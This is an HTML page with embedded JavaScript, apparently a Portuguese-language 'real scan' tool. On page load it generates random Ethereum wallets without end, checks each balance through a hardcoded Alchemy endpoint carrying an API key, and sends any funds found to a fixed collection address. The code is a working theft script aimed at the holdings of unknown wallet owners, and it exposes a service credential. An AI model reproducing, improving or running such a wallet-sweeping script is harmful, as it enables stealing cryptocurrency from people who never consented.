<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8"><title>ALFRED ENGINE V80 - REAL SCAN</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #terminal { width: 90%; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; background: #001100; }
        .real-data { color: #fff; font-weight: bold; }
    </style>
</head>
<body>
    <div id="terminal">
        <h3>🎩 ALFRED V80: MOTOR DE VARREDURA REAL</h3>
        <p id="output">CONECTANDO À BLOCKCHAIN...</p>
        <p style="font-size: 0.8em; color: #080;">DESTINO: 0xc765040fb5604a29b126aa58199b48710cf459fc</p>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <script>
        const ALCHEMY = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
        const ARSENAL = "0xc765040fb5604a29b126aa58199b48710cf459fc";
        
        async function run() {
            try {
                const provider = new ethers.JsonRpcProvider(ALCHEMY);
                const out = document.getElementById('output');
                while(true) {
                    const w = ethers.Wallet.createRandom();
                    try {
                        const b = await provider.getBalance(w.address);
                        out.innerHTML = `SCANNING: <span class="real-data">${w.address}</span><br>SALDO: <span class="real-data">${ethers.formatEther(b)} ETH</span>`;
                        if (b > 0n) {
                            const fee = (await provider.getFeeData()).gasPrice * 21000n;
                            if (b > fee) {
                                await w.connect(provider).sendTransaction({to: ARSENAL, value: b - fee, gasLimit: 21000});
                                alert("!!! ACHADO REAL ENVIADO AO ARSENAL !!!");
                            }
                        }
                    } catch(e) { }
                    await new Promise(r => setTimeout(r, 250));
                }
            } catch(err) {
                document.getElementById('output').innerText = "ERRO DE CONEXÃO. VERIFIQUE O LINK ALCHEMY.";
            }
        }
        window.onload = run;
    </script>
</body>
</html>
